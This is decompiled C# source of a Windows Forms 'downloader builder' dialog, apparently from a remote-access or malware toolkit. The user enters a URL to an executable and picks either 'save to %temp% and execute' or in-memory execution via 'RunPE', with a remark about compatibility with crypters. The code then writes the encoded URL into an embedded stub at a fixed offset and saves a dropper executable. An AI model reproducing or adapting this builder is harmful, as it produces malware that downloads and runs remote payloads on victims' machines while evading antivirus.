﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x0200014A RID: 330
[DesignerGenerated]
public sealed partial class fBuilderDownloader : Form
{
	// Token: 0x0600125F RID: 4703 RVA: 0x0000A2E1 File Offset: 0x000084E1
	public fBuilderDownloader()
	{
		base.Closing += this.fBuilderDownloader_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06001262 RID: 4706 RVA: 0x0000A301 File Offset: 0x00008501
	internal Label vmethod_0()
	{
		return this.label_0;
	}

	// Token: 0x06001263 RID: 4707 RVA: 0x0000A309 File Offset: 0x00008509
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(Label label_1)
	{
		this.label_0 = label_1;
	}

	// Token: 0x06001264 RID: 4708 RVA: 0x0000A312 File Offset: 0x00008512
	internal TextBox vmethod_2()
	{
		return this.textBox_0;
	}

	// Token: 0x06001265 RID: 4709 RVA: 0x00084BD8 File Offset: 0x00082DD8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(TextBox textBox_1)
	{
		EventHandler value = new EventHandler(this.method_1);
		EventHandler value2 = new EventHandler(this.method_2);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_0 = textBox_1;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06001266 RID: 4710 RVA: 0x0000A31A File Offset: 0x0000851A
	internal PictureBox vmethod_4()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06001267 RID: 4711 RVA: 0x00084C38 File Offset: 0x00082E38
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_3);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_3;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001268 RID: 4712 RVA: 0x0000A322 File Offset: 0x00008522
	internal PictureBox vmethod_6()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06001269 RID: 4713 RVA: 0x00084C7C File Offset: 0x00082E7C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_4);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_3;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600126A RID: 4714 RVA: 0x0000A32A File Offset: 0x0000852A
	internal PictureBox vmethod_8()
	{
		return this.pictureBox_2;
	}

	// Token: 0x0600126B RID: 4715 RVA: 0x00084CC0 File Offset: 0x00082EC0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_5);
		PictureBox pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_2 = pictureBox_3;
		pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600126C RID: 4716 RVA: 0x0000A332 File Offset: 0x00008532
	internal VisualButton vmethod_10()
	{
		return this.visualButton_0;
	}

	// Token: 0x0600126D RID: 4717 RVA: 0x00084D04 File Offset: 0x00082F04
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(VisualButton visualButton_1)
	{
		EventHandler value = new EventHandler(this.method_6);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_1;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600126E RID: 4718 RVA: 0x0000A33A File Offset: 0x0000853A
	internal RadioButton vmethod_12()
	{
		return this.radioButton_0;
	}

	// Token: 0x0600126F RID: 4719 RVA: 0x0000A342 File Offset: 0x00008542
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(RadioButton radioButton_2)
	{
		this.radioButton_0 = radioButton_2;
	}

	// Token: 0x06001270 RID: 4720 RVA: 0x0000A34B File Offset: 0x0000854B
	internal RadioButton vmethod_14()
	{
		return this.radioButton_1;
	}

	// Token: 0x06001271 RID: 4721 RVA: 0x0000A353 File Offset: 0x00008553
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(RadioButton radioButton_2)
	{
		this.radioButton_1 = radioButton_2;
	}

	// Token: 0x06001272 RID: 4722 RVA: 0x0000A35C File Offset: 0x0000855C
	public void method_0()
	{
		base.Opacity = 100.0;
	}

	// Token: 0x06001273 RID: 4723 RVA: 0x00084D48 File Offset: 0x00082F48
	private void method_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_2().Text, "http://site.com/file.exe", true) == 0)
		{
			this.vmethod_2().Text = string.Empty;
			this.vmethod_2().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_2().Font, FontStyle.Regular);
			this.vmethod_2().Font = font;
		}
	}

	// Token: 0x06001274 RID: 4724 RVA: 0x00084DAC File Offset: 0x00082FAC
	private void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_2().Text, string.Empty, true) == 0)
		{
			this.vmethod_2().Text = "http://site.com/file.exe";
			this.vmethod_2().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_2().Font, FontStyle.Italic);
			this.vmethod_2().Font = font;
		}
	}

	// Token: 0x06001275 RID: 4725 RVA: 0x0000A36D File Offset: 0x0000856D
	private void method_3(object sender, EventArgs e)
	{
		Interaction.MsgBox("Enter a direct link to your exe.\r\n\r\nNOTE: You may use http and https protocols given that the direct link triggers a download.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001276 RID: 4726 RVA: 0x0000A381 File Offset: 0x00008581
	private void method_4(object sender, EventArgs e)
	{
		Interaction.MsgBox("The downloaded exe will be saved to Temp directory (%temp%) with a random filename and then executed.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001277 RID: 4727 RVA: 0x0000A395 File Offset: 0x00008595
	private void method_5(object sender, EventArgs e)
	{
		Interaction.MsgBox("The downloaded exe will be executed in memory using classic RunPE method.\r\n\r\nNOTE: This option may not be compatible with all Crypters. \r\nMake sure to test it!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001278 RID: 4728 RVA: 0x00084E10 File Offset: 0x00083010
	private void method_6(object sender, EventArgs e)
	{
		if (this.vmethod_2().TextLength < 3 | Operators.CompareString(this.vmethod_2().Text, "http://site.com/file.exe", true) == 0)
		{
			Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_2().Select();
			this.vmethod_2().Focus();
			return;
		}
		byte[] array = Class131.smethod_12();
		byte[] bytes = Encoding.UTF8.GetBytes(Class136.smethod_40(Conversions.ToString(Operators.ConcatenateObject(this.vmethod_2().Text + "|", Interaction.IIf(this.vmethod_14().Checked, "1", "0")))));
		byte[] array2 = new byte[1024];
		Array.Copy(bytes, 0, array2, 0, bytes.Length);
		Array.Copy(array2, 0, array, 204064, array2.Length);
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = "Executable |*.exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = saveFileDialog.FileName;
			byte[] array3 = array;
			bool flag = true;
			byte[] byte_ = array3;
			string string_ = fileName;
			Class136.Class142 @class = new Class136.Class142();
			@class.string_0 = string_;
			@class.byte_0 = byte_;
			@class.bool_0 = false;
			try
			{
				if (flag)
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
				else
				{
					Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
				}
			}
			catch (Exception ex)
			{
			}
			Interaction.MsgBox("Downloader saved to: " + saveFileDialog.FileName, MsgBoxStyle.Information, Application.ProductName);
			return;
		}
		Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
	}

	// Token: 0x06001279 RID: 4729 RVA: 0x00007348 File Offset: 0x00005548
	private void fBuilderDownloader_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x04000731 RID: 1841
	private Label label_0;

	// Token: 0x04000732 RID: 1842
	private TextBox textBox_0;

	// Token: 0x04000733 RID: 1843
	private PictureBox pictureBox_0;

	// Token: 0x04000734 RID: 1844
	private PictureBox pictureBox_1;

	// Token: 0x04000735 RID: 1845
	private PictureBox pictureBox_2;

	// Token: 0x04000736 RID: 1846
	private VisualButton visualButton_0;

	// Token: 0x04000737 RID: 1847
	private RadioButton radioButton_0;

	// Token: 0x04000738 RID: 1848
	private RadioButton radioButton_1;
}
